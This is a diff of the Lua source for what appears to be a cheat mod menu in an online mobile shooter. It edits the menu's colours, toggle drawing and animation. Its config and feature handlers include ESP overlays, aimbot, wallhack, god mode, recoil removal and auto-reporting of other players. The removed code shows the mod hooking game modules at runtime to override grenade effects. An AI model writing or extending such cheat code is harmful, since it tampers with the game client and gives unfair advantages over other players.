-    TextUser        = FLinearColor(1.00, 1.00, 1.00, 1.00),  -- pure white — highlighted
-    TextTitle       = FLinearColor(1.0,  1.0,  1.0,  1.0),   -- pure white
-    TextCategory    = FLinearColor(0.85, 0.88, 1.00, 0.98),  -- bright blue-white highlight
-    TextRow         = FLinearColor(1.00, 1.00, 1.00, 1.0),   -- pure white rows
-    CategorySquare  = FLinearColor(0.80, 0.05, 0.08, 1.0),   -- crimson accent stripe
-    DividerTop      = FLinearColor(0.75, 0.04, 0.06, 0.30),  -- red tinted divider
-    DividerRow      = FLinearColor(1.0,  1.0,  1.0,  0.08),  -- subtle row separator
-    ToggleOn        = FLinearColor(0.85, 0.06, 0.10, 1.0),   -- crimson toggle ON
-    ToggleOnGlow    = FLinearColor(0.85, 0.06, 0.10, 0.38),  -- red toggle glow
-    ToggleOff       = FLinearColor(0.06, 0.06, 0.08, 1.00),  -- very dark near-black off
-    ToggleOffBorder = FLinearColor(1.0,  1.0,  1.0,  0.12),  -- subtle off-state border
-    KnobWhite       = FLinearColor(1.0,  1.0,  1.0,  1.0),
-    CloseBtnBg      = FLinearColor(0.22, 0.03, 0.04, 0.92),  -- dark red close button
-    CloseCross      = FLinearColor(1.0,  0.20, 0.20, 1.0),   -- vivid red X
-    HeaderLine      = FLinearColor(0.80, 0.05, 0.08, 0.80),  -- red header underline
-    TopPillBg       = FLinearColor(0.01, 0.01, 0.02, 0.96),  -- near-black pill
-    TopPillOutline  = FLinearColor(0.75, 0.05, 0.08, 0.65),  -- red pill border
-    TopPillShadow   = FLinearColor(0.0,  0.0,  0.0,  0.70),  -- heavy shadow
-    TopPillClock    = FLinearColor(1.0,  1.0,  1.0,  1.0),   -- white clock text
-    TopPillTitle    = FLinearColor(0.30, 0.60, 1.00, 1.0),   -- electric blue brand name
-    TopPillStatus   = FLinearColor(1.0,  1.0,  1.0,  0.95),  -- near-white status
-    TopPillDiv      = FLinearColor(0.80, 0.10, 0.12, 0.60),  -- red divider
-    IndicatorWhite  = FLinearColor(1.0,  1.0,  1.0,  0.90),
-    Transparent     = FLinearColor(0.0,  0.0,  0.0,  0.0),
-    RowHover        = FLinearColor(0.80, 0.04, 0.06, 0.06),  -- faint red row strip
-    SidebarSep      = FLinearColor(0.75, 0.04, 0.06, 0.22),  -- red sidebar separator
+    WindowBg        = FLinearColor(0.06, 0.07, 0.09, 0.58),
+    Outline         = FLinearColor(1.0, 1.0, 1.0, 0.14),
+    Shadow          = FLinearColor(0.0, 0.0, 0.0, 0.35),
+    SidebarBg       = FLinearColor(0.08, 0.09, 0.12, 0.55),
+    SidebarActiveBg = FLinearColor(0.45, 0.78, 0.68, 0.22),
+    IconUser        = FLinearColor(0.40, 0.70, 1.00, 1.0),
+    IconMain        = FLinearColor(1.00, 0.85, 0.25, 1.0),
+    IconESP         = FLinearColor(0.35, 1.00, 0.75, 1.0),
+    IconAim         = FLinearColor(1.00, 0.78, 0.15, 1.0),
+    IconMem         = FLinearColor(0.65, 0.55, 1.00, 1.0),
+    IconSet         = FLinearColor(0.70, 0.72, 0.76, 1.0),
+    TextDark = FLinearColor(0.98, 0.98, 1.0, 1.0),
+    TextActiveESP   = FLinearColor(0.52, 0.86, 0.74, 1.0),
+    TextUser        = FLinearColor(0.88, 0.90, 0.94, 0.92),
+    TextTitle = FLinearColor(1.0, 1.0, 1.0, 1.0),
+    TextCategory = FLinearColor(0.92, 0.93, 0.95, 1.0),
+    CategorySquare  = FLinearColor(0.50, 0.82, 0.72, 1.0),
+    DividerTop      = FLinearColor(1.0, 1.0, 1.0, 0.18),
+    DividerRow      = FLinearColor(1.0, 1.0, 1.0, 0.10),
+    ToggleOn        = FLinearColor(0.50, 0.82, 0.72, 1.0),
+    ToggleOff       = FLinearColor(0.28, 0.30, 0.34, 0.85),
+    KnobWhite       = FLinearColor(1.0, 1.0, 1.0, 1.0),
+    CloseBtnBg      = FLinearColor(0.12, 0.13, 0.16, 0.70),
+    CloseCross      = FLinearColor(0.95, 0.40, 0.38, 1.0),
+    TopPillBg       = FLinearColor(0.07, 0.08, 0.11, 0.55),
+    TopPillOutline  = FLinearColor(1.0, 1.0, 1.0, 0.16),
+    TopPillShadow   = FLinearColor(0.0, 0.0, 0.0, 0.28),
+    TopPillClock    = FLinearColor(1.0, 1.0, 1.0, 0.98),
+    TopPillTitle    = FLinearColor(0.52, 0.86, 0.74, 1.0),
+    TopPillStatus   = FLinearColor(1.0, 1.0, 1.0, 0.92),
+    TopPillDiv      = FLinearColor(1.0, 1.0, 1.0, 0.55),
+    IndicatorWhite  = FLinearColor(1.0, 1.0, 1.0, 0.90),
+    Transparent     = FLinearColor(0.0, 0.0, 0.0, 0.0),
 }
 _G.GTLMODConfig = _G.GTLMODConfig or {}
 local defaultConfig = {
@@ -12259,16 +10484,17 @@ local defaultConfig = {
     EspItem_Shotgun = true, EspItem_LMG = true, EspItem_Pistol = true, EspItem_Scope = true,
     EspItem_Med = true, EspItem_Grenade = true, EspItem_Special = false,
     EspModelName = false, EspShowDistance = false, EspShowHealthBar = false, EspTeamColorBox = false,
-    EspBox = false, EspLine = false, EspLineColor = 6, CounterEnabled = false,
+    EspBox = false, EspLine = false, CounterEnabled = false,
     EspWeaponIcon = false, EspActiveBom = false,
-    WorldRain = false, WorldSnow = false,
     AimTouchEnable = false, ForceAimbot = false, AimTouchIgKnock = true, AimTouchIgBot = true, AimTouchVisCheck = true,
     PrivSmallCrosshair = false,
-    WallhackSmart = false, AutoReport = false, AutoReportDual = false, AutoReportReason = 1, AutoReportDelay = 3.0, ForceTPP = false, IpadView = false, CustomHRecoil = false, CustomVRecoil = false,
+    WallhackSmart = false, IpadView = false, CustomHRecoil = false, CustomVRecoil = false,
     CustomAimbot = false, CustomAimbotClose = false, LessShake = false, Accuracy = false, GodMode = false,
     BlackSky = false, RemoveGrass = false, RemoveFog = false,
     PotatoGraphics = false, FPSStabilizer = false, CleaningSpace = false, UnlockFPS = false, TargetFPS = 165,
-    }
+    ModSkin = false, SkinSuit = 1, SkinBag = 1, SkinHelmet = 1, SkinGloves = 1,
+    SkinGlider = 1, SkinParachute = 1, SkinM416 = 1, SkinAKM = 1, SkinSCAR = 1,
+}
 for k, v in pairs(defaultConfig) do
     if _G.GTLMODConfig[k] == nil then _G.GTLMODConfig[k] = v end
 end
@@ -12277,7 +10503,7 @@ if _G.GTLMODConfig.EspBox == nil then
 end
 _G.GTLMODConfig.EspBox = _G.GTLMODConfig.EspBox == true
 _G.GTLMODConfig.Esp5 = _G.GTLMODConfig.EspBox
--- EspV2Enabled follows EspBox only inside UpdateFeature(EspBox), not globally
+_G.GTLMODConfig.EspV2Enabled = _G.GTLMODConfig.EspBox
 _G.GTLMODState = _G.GTLMODState or { CustomTextData = {} }
 if not _G.GTLMODState.CustomTextData then _G.GTLMODState.CustomTextData = {} end
 _G.GTLMODState.CustomTextData.IpadViewFOV = _G.GTLMODState.CustomTextData.IpadViewFOV or 120
@@ -12305,235 +10531,24 @@ local function ScheduleFeatureRuntimeSync(configKey)
         end
     end)
 end
-
--- ========== WORLD weather (from weather.lua patterns) ==========
-_G.ApplyWorldRain = function(enabled)
-    enabled = enabled == true
-    _G.GTLMODConfig = _G.GTLMODConfig or {}
-    _G.GTLMODConfig.WorldRain = enabled
-    pcall(function()
-        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
-        if not slua.isValid(pc) then return end
-        local ch = nil
-        pcall(function() ch = pc.GetPlayerCharacterSafety and pc:GetPlayerCharacterSafety() end)
-        if slua.isValid(ch) then
-            local E = import("EScreenParticleEffectType")
-            if E and ch.SetRainyEffectEnable then
-                ch:SetRainyEffectEnable(E.ESPET_Rainy, enabled, enabled and 500 or 0)
-            end
-        end
-        local SubsystemMgr = _G.SubsystemMgr
-        if not SubsystemMgr then
-            local ok, m = pcall(require, "GameLua.GameCore.Module.Subsystem.SubsystemMgr")
-            if ok then SubsystemMgr = m end
-        end
-        if SubsystemMgr and SubsystemMgr.Get then
-            local ws = SubsystemMgr.Get("CreativeModeWeatherSubsystem")
-            if slua.isValid(ws) then
-                if enabled then
-                    if ws.StartRainScreenEffect then ws:StartRainScreenEffect() end
-                else
-                    if ws.StopRainScreenEffect then ws:StopRainScreenEffect() end
-                end
-            end
-        end
-    end)
-end
-_G.ApplyWorldSnow = function(enabled)
-    enabled = enabled == true
-    _G.GTLMODConfig = _G.GTLMODConfig or {}
-    _G.GTLMODConfig.WorldSnow = enabled
-    pcall(function()
-        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
-        if not slua.isValid(pc) then return end
-        local ch = nil
-        pcall(function() ch = pc.GetPlayerCharacterSafety and pc:GetPlayerCharacterSafety() end)
-        if slua.isValid(ch) then
-            local E = import("EScreenParticleEffectType")
-            if E and ch.SetRainyEffectEnable then
-                ch:SetRainyEffectEnable(E.ESPET_Snowy, enabled, enabled and 500 or 0)
-            end
-        end
-        local SubsystemMgr = _G.SubsystemMgr
-        if not SubsystemMgr then
-            local ok, m = pcall(require, "GameLua.GameCore.Module.Subsystem.SubsystemMgr")
-            if ok then SubsystemMgr = m end
-        end
-        if SubsystemMgr and SubsystemMgr.Get then
-            local ws = SubsystemMgr.Get("CreativeModeWeatherSubsystem")
-            if slua.isValid(ws) then
-                if enabled then
-                    if ws.StartSnowScreenEffect then ws:StartSnowScreenEffect()
-                    elseif ws.StartRainScreenEffect then ws:StartRainScreenEffect() end
-                else
-                    if ws.StopSnowScreenEffect then ws:StopSnowScreenEffect()
-                    elseif ws.StopRainScreenEffect then ws:StopRainScreenEffect() end
-                end
-            end
-        end
-    end)
-end
-
--- ========== Grenade explosion FX (tied to EspActiveBom, every throw) ==========
-_G._MagooGrenadeFX = _G._MagooGrenadeFX or {
-    applied = false,
-    forcedWeapon = 1101005098,
-    particle = nil,
-    loading = false,
-}
-local GRENADE_FX_PATHS = {
-    -- prefer cooler / larger blooms when present
-    "/Game/Arts_Effect/ParticleSystems/Grenade/P_Grenade_Explode_01.P_Grenade_Explode_01",
-    "/Game/Arts_Effect/ParticleSystems/Grenade/P_Grenade_Fire_Explode_01_Int.P_Grenade_Fire_Explode_01_Int",
-    "/Game/Arts_Effect/ParticleSystems/Grenade/P_Grenade_Explode_stone_02.P_Grenade_Explode_stone_02",
-}
-local function MagooGrenadePreload()
-    local G = _G._MagooGrenadeFX
-    if G.particle or G.loading then return end
-    G.loading = true
-    pcall(function()
-        local util = require("client.slua_ui_framework.util")
-        if not (util and util.GetAssetAsync) then G.loading = false return end
-        local idx = 1
-        local function tryNext()
-            if idx > #GRENADE_FX_PATHS then G.loading = false return end
-            local path = GRENADE_FX_PATHS[idx]
-            idx = idx + 1
-            util.GetAssetAsync(path, function(asset)
-                if slua.isValid(asset) then
-                    G.particle = asset
-                    G.loading = false
-                else
-                    tryNext()
-                end
-            end)
-        end
-        tryNext()
-    end)
-end
-local function MagooGrenadeSpawnAt(loc)
-    if not loc then return end
-    local G = _G._MagooGrenadeFX
-    pcall(function()
-        if not G.particle then MagooGrenadePreload() end
-        local UGS = import("GameplayStatics")
-        local world = slua_GameFrontendHUD and slua_GameFrontendHUD:GetWorld()
-        if not (slua.isValid(world) and UGS and UGS.SpawnEmitterAtLocation) then return end
-        if slua.isValid(G.particle) then
-            -- larger scale for visible bloom; slight blue-tinted second burst if available
-            UGS.SpawnEmitterAtLocation(world, G.particle, loc, FRotator(0, 0, 0), FVector(1.6, 1.6, 1.6), true)
-            UGS.SpawnEmitterAtLocation(world, G.particle, loc, FRotator(0, 45, 0), FVector(1.15, 1.15, 1.15), true)
-        end
-    end)
-end
-local function MagooGrenadeApply()
-    local G = _G._MagooGrenadeFX
-    MagooGrenadePreload()
-    if G.applied then return true end
-    pcall(function()
-        local forceId = G.forcedWeapon or 1101005098
-        local ok, mod = pcall(require, "GameLua.Mod.Library.GamePlay.Avatar.Component.GrenadeAvatarComponent")
-        if ok and mod and type(mod.__inner_impl) == "table" then
-            local impl = mod.__inner_impl
-            if type(rawget(impl, "CheckHasOverrideFx")) == "function" and not G._hooked then
-                local orig = rawget(impl, "CheckHasOverrideFx")
-                rawset(impl, "CheckHasOverrideFx", function(comp, PlayerController, GrenadeSkinID)
-                    if _G.GTLMODConfig and _G.GTLMODConfig.EspActiveBom == true then
-                        if comp.SetOverrideFxIndex then pcall(comp.SetOverrideFxIndex, comp, forceId) end
-                        if comp.SetOverrideSoundIndex then pcall(comp.SetOverrideSoundIndex, comp, forceId) end
-                        return
-                    end
-                    return orig(comp, PlayerController, GrenadeSkinID)
-                end)
-                G._hooked = true
-            end
-        end
-        for path, mod in pairs(package.loaded) do
-            if type(path) == "string" and type(mod) == "table" and path:find("FragGrenade") and not path:find("LuaGet") then
-                local impl = mod.__inner_impl
-                local cur = impl
-                while cur do
-                    if type(rawget(cur, "BeginInEffect")) == "function" and not G._beginHooked then
-                        local origB = rawget(cur, "BeginInEffect")
-                        rawset(cur, "BeginInEffect", function(self, OldType)
-                            if not Client then return origB(self, OldType) end
-                            local on = (_G.GTLMODConfig and _G.GTLMODConfig.EspActiveBom == true)
-                            local loc = nil
-                            pcall(function()
-                                if self and self.K2_GetActorLocation then loc = self:K2_GetActorLocation() end
-                            end)
-                            if on then
-                                local saved = self.SpawnExplosionEffect
-                                if type(saved) == "function" then self.SpawnExplosionEffect = function() end end
-                                pcall(origB, self, OldType)
-                                if type(saved) == "function" then self.SpawnExplosionEffect = saved end
-                                MagooGrenadeSpawnAt(loc)
-                            else
-                                return origB(self, OldType)
-                            end
-                        end)
-                        G._beginHooked = true
-                        break
-                    end
-                    cur = cur.__super_impl
-                end
-            end
-        end
-        G.applied = true
-    end)
-    return G.applied
-end
-_G.MagooGrenadeApply = MagooGrenadeApply
-_G.MagooGrenadeSetEnabled = function(on)
-    if on then
-        pcall(MagooGrenadeApply)
-        pcall(MagooGrenadePreload)
-    end
-end
-
-
-
 local function UpdateFeature(configKey, isEnabled)
     _G.GTLMODConfig[configKey] = (isEnabled == true)
     if configKey == "EspBox" or configKey == "Esp5" then
-        -- AUTO SETUP only. Never touch EspLine or EspWeaponIcon.
-        local boxEnabled = (isEnabled == true)
+        local boxEnabled = isEnabled == true
         _G.GTLMODConfig.EspBox = boxEnabled
         _G.GTLMODConfig.Esp5 = boxEnabled
         _G.GTLMODConfig.Box = boxEnabled
         _G.GTLMODConfig.EspV2Enabled = boxEnabled
-        if not boxEnabled then
-            pcall(function() if _G.ClearAllBoxESP then _G.ClearAllBoxESP() end end)
-            -- force ClearVision to drop brackets immediately
-            pcall(function()
-                if type(_G.ClearVisionV2Sync) == "function" then _G.ClearVisionV2Sync() end
-            end)
-        else
-            pcall(function()
-                if type(_G.ClearVisionV2Start) == "function" then _G.ClearVisionV2Start() end
-                if type(_G.ClearVisionV2Sync) == "function" then _G.ClearVisionV2Sync() end
-            end)
-        end
-        -- do not write EspLine, EspV2SnapLine, EspWeaponIcon
+        if not isEnabled and _G.ClearAllBoxESP then pcall(_G.ClearAllBoxESP) end
     elseif configKey == "EspLine" then
-        -- SNAP LINES only. Never touch EspBox or EspWeaponIcon.
-        local lineOn = (isEnabled == true)
-        _G.GTLMODConfig.Line = lineOn
-        _G.GTLMODConfig.EspLine = lineOn
-        _G.GTLMODConfig.EspV2SnapLine = lineOn
-        if _G.LexusConfig then _G.LexusConfig.Esp9_Line = lineOn end
-        pcall(function()
-            if type(_G.ClearVisionV2Sync) == "function" then _G.ClearVisionV2Sync() end
-        end)
-        -- do not write EspBox, Esp5, EspV2Enabled, EspWeaponIcon
+        _G.GTLMODConfig.Line = isEnabled
+        _G.GTLMODConfig.EspLine = isEnabled and true or false
     elseif configKey == "CounterEnabled" then
         _G.GTLMODConfig.CounterEnabled = isEnabled and true or false
-        if not isEnabled then
-            pcall(function()
-                if _G.RedBoxOverlay and _G.RedBoxOverlay.Stop then pcall(_G.RedBoxOverlay.Stop) end
-                if _G.RJCounter and _G.RJCounter.SetEnabled then pcall(_G.RJCounter.SetEnabled, false) end
-            end)
-        end
+        pcall(function()
+            if _G.RedBoxOverlay and _G.RedBoxOverlay.Stop then pcall(_G.RedBoxOverlay.Stop) end
+            if _G.RJCounter and _G.RJCounter.SetEnabled then pcall(_G.RJCounter.SetEnabled, false) end
+        end)
     elseif configKey == "EspRadar" then
         _G.GTLMODConfig.EspRadar = isEnabled and true or false
         if isEnabled then
@@ -12578,38 +10593,8 @@ local function UpdateFeature(configKey, isEnabled)
     elseif configKey == "ForceAimbot" then
         _G.GTLMODConfig.AimTouchEnable = isEnabled
         _G._ForceAimbotWanted = isEnabled
-        if _G.SaveModSettings then pcall(_G.SaveModSettings) end
     elseif configKey == "ForceAimbotScope" then
         _G.GTLMODConfig.ForceAimbotScope = isEnabled and true or false
-    elseif configKey == "EspWeaponIcon" then
-        _G.GTLMODConfig.EspWeaponIcon = false
-
-    elseif configKey == "AutoReport" then
-        _G.GTLMODConfig.AutoReport = isEnabled and true or false
-        _G.AutoReportConfig = _G.AutoReportConfig or {}
-        _G.AutoReportConfig.Enable = isEnabled and true or false
-        _G.AutoReportConfig.ReportReason = tonumber(_G.GTLMODConfig.AutoReportReason) or 1
-        _G.AutoReportConfig.ReportDelay = tonumber(_G.GTLMODConfig.AutoReportDelay) or 3.0
-        if isEnabled then
-            _G.AutoReportConfig._reportedPlayers = {}
-            _G.AutoReportConfig._reportQueue = {}
-        else
-            pcall(function()
-                _G.AutoReportConfig._reportQueue = {}
-                _G.AutoReportConfig._reportedPlayers = {}
-            end)
-        end
-    elseif configKey == "AutoReportDual" then
-        _G.GTLMODConfig.AutoReportDual = isEnabled and true or false
-        if isEnabled then _G._MagooDualArmed = true end
-        _G.AutoReportConfig = _G.AutoReportConfig or {}
-        _G.AutoReportConfig.Dual = _G.GTLMODConfig.AutoReportDual
-    elseif configKey == "ForceTPP" then
-        _G.GTLMODConfig.ForceTPP = isEnabled and true or false
-        _G.ForceTPP_Enable = isEnabled and true or false
-        if isEnabled then
-            pcall(function() if _G.MagooTppView then _G.MagooTppView() end end)
-        end
     elseif configKey == "WallhackSmart" then
         if isEnabled then
             if _G.RefreshWallhackColors then pcall(_G.RefreshWallhackColors) end
@@ -12639,21 +10624,6 @@ local function UpdateFeature(configKey, isEnabled)
                 end)
             end
         end
-    elseif configKey == "WorldRain" then
-        _G.GTLMODConfig.WorldRain = isEnabled == true
-        if _G.ApplyWorldRain then pcall(_G.ApplyWorldRain, isEnabled == true) end
-        if isEnabled and _G.GTLMODConfig.WorldSnow then
-            -- mutual exclusive soft: keep both allowed, no force-off of snow
-        end
-    elseif configKey == "WorldSnow" then
-        _G.GTLMODConfig.WorldSnow = isEnabled == true
-        if _G.ApplyWorldSnow then pcall(_G.ApplyWorldSnow, isEnabled == true) end
-    elseif configKey == "EspActiveBom" then
-        _G.GTLMODConfig.EspActiveBom = isEnabled == true
-        _G.LexusConfig = _G.LexusConfig or {}
-        _G.LexusConfig.EspActiveBom = isEnabled == true
-        _G.LexusConfig.EspBomMaster = isEnabled == true
-        if _G.MagooGrenadeSetEnabled then pcall(_G.MagooGrenadeSetEnabled, isEnabled == true) end
     elseif configKey == "BlackSky" then
         if _G.ApplyBlackSky then pcall(_G.ApplyBlackSky, isEnabled) end
     elseif configKey == "IpadView" then
@@ -12690,6 +10660,10 @@ local function UpdateFeature(configKey, isEnabled)
         else
             pcall(function() if _G.ClearAllItemESPGlow then _G.ClearAllItemESPGlow() end end)
         end
+    elseif configKey == "ModSkin" or configKey == "SkinDeadBox" or configKey == "SkinPet" or configKey == "SkinXSuit" then
+        -- Skin system removed
+        _G.GTLMODConfig[configKey] = false
+        if _G.MagooEnableAllSkins then pcall(_G.MagooEnableAllSkins, false) end
     elseif configKey == "EspRadar" then
         if isEnabled then
             pcall(function() if InitScreenMarkSystem then InitScreenMarkSystem() end end)
@@ -12717,6 +10691,74 @@ local SIDEBAR_W, SIDEBAR_H  = 83, 396
 local INDICATOR_W           = 226
 local INDICATOR_H           = 5
 local currentTab = "DEAD_EYE"
+-- Continuous B&W sweep animation state
+local _MagooSweepPhase = 0
+local _MagooSweepBar = nil
+local _MagooSweepActive = false
+local function MagooSweepTick()
+    if not isMenuOpen or not IsValid(bgPanel) then
+        _MagooSweepActive = false
+        if IsValid(_MagooSweepBar) then
+            pcall(function() _MagooSweepBar:RemoveFromParent() end)
+            _MagooSweepBar = nil
+        end
+        return
+    end
+    _MagooSweepPhase = (_MagooSweepPhase + 0.045) % 1.0
+    pcall(function()
+        if not IsValid(_MagooSweepBar) then
+            _MagooSweepBar = NewObject("/Script/UMG.Border", bgPanel)
+            if IsValid(_MagooSweepBar) then
+                local slot = bgPanel:AddChildToCanvas(_MagooSweepBar)
+                if slot then
+                    slot:SetAutoSize(false)
+                    slot:SetSize(FVector2D(48, MENU_H))
+                    slot:SetZOrder(8)
+                end
+                SetVis(_MagooSweepBar, "HitTestInvisible")
+            end
+        end
+        if IsValid(_MagooSweepBar) then
+            local x = -40 + (_MagooSweepPhase * (MENU_W + 80))
+            -- alternate black / white alpha for sweep
+            local t = _MagooSweepPhase
+            local a = 0.08 + 0.10 * math.abs(math.sin(t * math.pi * 2))
+            local isWhite = (math.floor(t * 6) % 2 == 0)
+            local col
+            if isWhite then
+                col = FLinearColor(1.0, 1.0, 1.0, a)
+            else
+                col = FLinearColor(0.0, 0.0, 0.0, a * 1.4)
+            end
+            pcall(function() _MagooSweepBar:SetBrushColor(col) end)
+            local slot = _MagooSweepBar.Slot
+            if slot and slot.SetPosition then
+                slot:SetPosition(FVector2D(x, 0))
+            end
+        end
+    end)
+    -- schedule next frame
+    pcall(function()
+        local tk = package.loaded["common.time_ticker"] or require("common.time_ticker")
+        if tk and tk.AddTimerOnce then
+            tk.AddTimerOnce(0.033, MagooSweepTick)
+        end
+    end)
+end
+local function MagooStartSweep()
+    if _MagooSweepActive then return end
+    _MagooSweepActive = true
+    _MagooSweepPhase = 0
+    MagooSweepTick()
+end
+local function MagooStopSweep()
+    _MagooSweepActive = false
+    if IsValid(_MagooSweepBar) then
+        pcall(function() _MagooSweepBar:RemoveFromParent() end)
+        _MagooSweepBar = nil
+    end
+end
+
 local bgPanel, bgSlot, floatContainer, floatSlot, topPillContainer, topPillSlot = nil, nil, nil, nil, nil, nil
 local sidebarContainer, contentContainer, parentCanvas, isMenuOpen, clockTextBlock = nil, nil, nil, false, nil
 function GetCanvas()
@@ -12952,48 +10994,21 @@ local function DrawToggle(parent, x, y, configKey)
     local function redraw(state)
         if not IsValid(root) then return end
         root:ClearChildren()
-        if state then
-            -- ON: double-layer glow — wide soft bloom + tighter bright halo
-            local glow = C.ToggleOnGlow or FLinearColor(0.00, 0.85, 1.00, 0.35)
-            RoundedPanel(root, -5, -5, tw + 10, th + 10, tr + 5, FLinearColor(0.00, 0.85, 1.00, 0.14), 9)
-            RoundedPanel(root, -3, -3, tw + 6,  th + 6,  tr + 3, glow, 10)
-        else
-            -- OFF: subtle border so it reads against dark background
-            RoundedPanel(root, -1, -1, tw + 2, th + 2, tr + 1, C.ToggleOffBorder or FLinearColor(1,1,1,0.14), 11)
-        end
         local trackColor = state and C.ToggleOn or C.ToggleOff
         RoundedPanel(root, 0, 0, tw, th, tr, trackColor, 12)
-        -- ON track: inner top-edge highlight for glass feel
-        if state then
-            RoundedPanel(root, 2, 1, tw - 4, 3, 1, FLinearColor(1, 1, 1, 0.22), 13)
-        end
         local knobX = state and 24 or 3
-        -- knob: drop shadow underneath, then white knob, then top shine
-        RoundedPanel(root, knobX + 1, 5, 20, 20, 10, FLinearColor(0, 0, 0, 0.30), 13)
         RoundedPanel(root, knobX, 3, 20, 20, 10, C.KnobWhite, 14)
-        RoundedPanel(root, knobX + 3, 4, 10, 6, 3, FLinearColor(1, 1, 1, 0.55), 15)
+        RoundedPanel(root, knobX + 1, 4, 20, 20, 10, FLinearColor(0, 0, 0, 0.12), 13)
         MakeBtn(root, -6, -6, tw + 12, th + 12, 16, function()
-            local newState = not (_G.GTLMODConfig[configKey] == true)
+            local newState = not (_G.GTLMODConfig[configKey] and true or false)
             UpdateFeature(configKey, newState)
-            if _G.SaveModSettings then pcall(_G.SaveModSettings) end
-            -- always read back the live flag so OFF stays OFF visually
-            local live = (_G.GTLMODConfig[configKey] == true)
-            if configKey == "ForceAimbot" or configKey == "EspBox" or configKey == "EspLine"
-                or configKey == "AutoReport" or configKey == "AutoReportDual" or configKey == "ForceTPP" then
-                if type(RenderContent) == "function" then
-                    pcall(RenderContent)
-                    return
-                end
-            end
-            redraw(live)
+            redraw(newState)
         end)
     end
     redraw(_G.GTLMODConfig[configKey] == true)
 end
 local function DrawRow(parent, labelText, yPos, configKey)
-    -- faint row background strip — adds visual rhythm and depth
-    RoundedPanel(parent, 115, yPos + 2, 495, 34, 8, C.RowHover or FLinearColor(1, 1, 1, 0.04), 9)
-    Text(parent, labelText, 119, yPos + 12, 14, (C.TextRow or C.TextUser or C.TextTitle), 12, 0.0, 0.5)
+    Text(parent, labelText, 119, yPos + 12, 14, C.TextDark, 12, 0.0, 0.5)
     DrawToggle(parent, 570, yPos, configKey)
 end
 local function DrawHouseIcon(parent, ox, oy)
@@ -13040,97 +11055,64 @@ local function DrawSetIcon(parent, ox, oy)
     Layer(parent, ox + 5,  oy + 12, 3, 4, C.KnobWhite, 15)
     Layer(parent, ox + 20, oy + 12, 3, 4, C.KnobWhite, 15)
 end
--- Permanent drawn tab icons (no GitHub / no external PNG)
-local function TabIcon(parent, x, y, size, tabId, fallbackColor)
-    local col = fallbackColor or C.IconESP
-    local white = FLinearColor(0.95, 0.97, 1.00, 1.00)
-    local dark = FLinearColor(0.05, 0.07, 0.10, 0.95)
-
-    RoundedPanel(parent, x, y, size, size, 9, col, 11)
-    RoundedPanel(parent, x + 2, y + 2, size - 4, size - 4, 7, dark, 12)
-
-    local cx = x + size * 0.5
-    local cy = y + size * 0.5
-    local s = size
-
-    if tabId == "DEAD_EYE" then
-        RoundedPanel(parent, x + s * 0.18, y + s * 0.28, s * 0.64, s * 0.44, s * 0.22, white, 13)
-        RoundedPanel(parent, x + s * 0.36, y + s * 0.36, s * 0.28, s * 0.28, s * 0.14, col, 14)
-        RoundedPanel(parent, x + s * 0.44, y + s * 0.44, s * 0.12, s * 0.12, s * 0.06, white, 15)
-    elseif tabId == "FUCK_AIM" then
-        -- scope: corner brackets + cross (distinct from GAME_OPT)
-        local t, gap = s * 0.16, s * 0.12
-        RoundedPanel(parent, x + gap, y + gap, t, 3, 1, white, 13)
-        RoundedPanel(parent, x + gap, y + gap, 3, t, 1, white, 13)
-        RoundedPanel(parent, x + s - gap - t, y + gap, t, 3, 1, white, 13)
-        RoundedPanel(parent, x + s - gap - 3, y + gap, 3, t, 1, white, 13)
-        RoundedPanel(parent, x + gap, y + s - gap - 3, t, 3, 1, white, 13)
-        RoundedPanel(parent, x + gap, y + s - gap - t, 3, t, 1, white, 13)
-        RoundedPanel(parent, x + s - gap - t, y + s - gap - 3, t, 3, 1, white, 13)
-        RoundedPanel(parent, x + s - gap - 3, y + s - gap - t, 3, t, 1, white, 13)
-        RoundedPanel(parent, cx - 1.5, cy - s * 0.18, 3, s * 0.36, 1, white, 14)
-        RoundedPanel(parent, cx - s * 0.18, cy - 1.5, s * 0.36, 3, 1, white, 14)
-        RoundedPanel(parent, cx - s * 0.06, cy - s * 0.06, s * 0.12, s * 0.12, s * 0.06, col, 15)
-    elseif tabId == "GAME_OPT" then
-        -- settings: 3 slider bars with knobs
-        local barW, barH, left = s * 0.56, 3.5, x + s * 0.18
-        local ys = { y + s * 0.22, y + s * 0.46, y + s * 0.70 }
-        local knobs = { 0.72, 0.38, 0.58 }
-        for i = 1, 3 do
-            RoundedPanel(parent, left, ys[i], barW, barH, 1.5, white, 13)
-            local kx = left + barW * knobs[i] - s * 0.07
-            RoundedPanel(parent, kx, ys[i] - s * 0.06, s * 0.14, s * 0.14, s * 0.07, col, 14)
-            RoundedPanel(parent, kx + s * 0.03, ys[i] - s * 0.03, s * 0.08, s * 0.08, s * 0.04, white, 15)
+local function SetImageBrush(img, path)
+    if not (img and path and path ~= "") then return end
+    pcall(function()
+        if img.SetBrushFromPath then
+            img:SetBrushFromPath(path)
+            return
         end
-    elseif tabId == "DANGER" then
-        RoundedPanel(parent, cx - s * 0.10, y + s * 0.16, s * 0.20, s * 0.48, 3, white, 13)
-        RoundedPanel(parent, cx - s * 0.08, y + s * 0.70, s * 0.16, s * 0.14, 3, white, 13)
-    elseif tabId == "WORLD" then
-        RoundedPanel(parent, x + s * 0.16, y + s * 0.16, s * 0.68, s * 0.68, s * 0.34, white, 13)
-        RoundedPanel(parent, x + s * 0.24, y + s * 0.24, s * 0.52, s * 0.52, s * 0.26, dark, 14)
-        RoundedPanel(parent, x + s * 0.30, cy - 1.5, s * 0.40, 3, 1, white, 15)
-        RoundedPanel(parent, cx - 1.5, y + s * 0.28, 3, s * 0.44, 1, white, 15)
-    elseif tabId == "USER" then
-        RoundedPanel(parent, cx - s * 0.14, y + s * 0.14, s * 0.28, s * 0.28, s * 0.14, white, 13)
-        RoundedPanel(parent, x + s * 0.20, y + s * 0.48, s * 0.60, s * 0.36, 8, white, 13)
-    else
-        Text(parent, "•", cx, cy, math.floor(s * 0.55), white, 15, 0.5, 0.5)
-    end
+        if img.SetBrushFromSoftPath then
+            img:SetBrushFromSoftPath(path)
+            return
+        end
+        local ok, tex = pcall(function()
+            return slua.loadObject and slua.loadObject(path) or nil
+        end)
+        if ok and tex and img.SetBrushFromTexture then
+            img:SetBrushFromTexture(tex, true)
+        end
+    end)
 end
-
+local function TabIcon(parent, x, y, size, path, fallbackColor)
+    local img = nil
+    pcall(function()
+        img = NewObject("/Script/UMG.Image", parent)
